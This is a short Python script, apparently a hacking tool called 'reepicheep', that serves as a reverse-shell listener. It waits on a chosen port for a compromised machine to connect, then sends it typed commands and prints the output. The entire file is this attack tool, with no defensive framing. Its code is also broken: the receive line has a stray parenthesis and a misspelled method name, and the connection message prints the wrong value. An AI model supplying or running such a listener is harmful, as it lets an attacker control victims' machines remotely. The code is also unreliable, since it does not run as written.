import socket
# ------------------------------------------------ #
# Logo
def show_logo():
    print("\033[92m")
    print("           (\-.")
    print("           / _`>")
    print("   _)     / _)=")
    print("  (      / _/   [reepicheep]")
    print("   `-.__(___)_     v1.0.8")
    print("\033[00m")

# Main menu:
show_logo()
# Set port:
port = int(input("\033[92m[>] Listen on port:\033[00m "))
# Start socket:
print("\033[92m[*] Starting socket.\033[00m")
skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname("")
skt.bind((host, port))
# Listen:
print("\033[92m[*] Listening on \033[00m{0}\033[92m:\033[00m{1}\033[00m".format(host, port))
# Recv connection?
client, addr = skt.accept()
print("\033[92m[*] Received shell from \033[00m{0}\033[92m!\033[00m".format(client))
# Command Loop:
cmd = ""
try:
    while cmd != "--quit":
        cmd = input("\033[92m[>] \033[00m")
        client.send(cmd.encode())
        response = client.rcv(1024))
        print("\033[92m[R]\033[00m {0}".format(response.decode()))
    # Close & Quit:
    print("\033[92m[*] Closing connections.\033[00m")
    skt.close()
    print("\033[92m[*] Quiting.\033[00m")
    quit()
except Exception as error:
    print(error)
